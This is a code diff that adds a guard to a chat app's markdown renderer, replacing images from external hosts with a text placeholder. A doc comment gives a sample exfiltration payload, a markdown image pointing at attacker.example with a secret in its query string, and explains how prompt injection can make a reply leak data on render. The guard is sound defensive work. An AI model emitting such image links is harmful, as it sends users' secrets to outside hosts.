@@ -444,6 +444,57 @@ export function MathDisplay(props: ComponentProps<"span"> & ExtraProps) {
 	);
 }
 
+// ─── External images (prompt-injection exfiltration guard) ───────────────────
+
+/** May a markdown image load? Only paths on this server. Any other host
+ *  would receive the request the moment a reply renders, with no click: a
+ *  prompt-injected `![](https://attacker.example/?k=<secret>)` would leak on
+ *  sight. (data:/blob: never get here: Streamdown's sanitizer already drops
+ *  them, and harden rewrites protocol-relative `//host/x` to a local path.) */
+export function imageSourceAllowed(src: unknown): boolean {
+	if (typeof src !== "string" || src === "") return false;
+	try {
+		return new URL(src, "http://lh.invalid/").origin === "http://lh.invalid"; // relative path
+	} catch {
+		return false;
+	}
+}
+
+type HastNode = { type: string; tagName?: string; properties?: Record<string, unknown>; children?: HastNode[] };
+
+function blockedImagePlaceholder(img: HastNode): HastNode {
+	const alt = typeof img.properties?.alt === "string" && img.properties.alt.trim() ? img.properties.alt.trim() : "image";
+	let host = "";
+	try {
+		host = new URL(String(img.properties?.src)).host;
+	} catch {
+		/* unparsable: alt text only */
+	}
+	return {
+		type: "element",
+		tagName: "span",
+		properties: { dataStreamdown: "image-blocked", className: ["text-muted-foreground", "text-xs", "italic"] },
+		children: [{ type: "text", value: `[image not loaded: ${host ? `${alt} · ${host}` : alt}]` } as HastNode],
+	};
+}
+
+/** Rehype step after Streamdown's sanitize + harden: external images become
+ *  a muted text placeholder and are never requested. Allowed images keep
+ *  Streamdown's own image component (download button, error fallback). */
+export function rehypeBlockExternalImages() {
+	const walk = (node: HastNode) => {
+		if (!node.children) return;
+		node.children = node.children.map((child) => {
+			if (child.type === "element" && child.tagName === "img" && !imageSourceAllowed(child.properties?.src)) {
+				return blockedImagePlaceholder(child);
+			}
+			walk(child);
+			return child;
+		});
+	};
+	return (tree: HastNode) => walk(tree);
+}
+
 // ─── The stable override set (module identity: Streamdown is memoized) ────────
 
 /** Bold as the REAL element (appearance fix, 2026-09-23): streamdown's
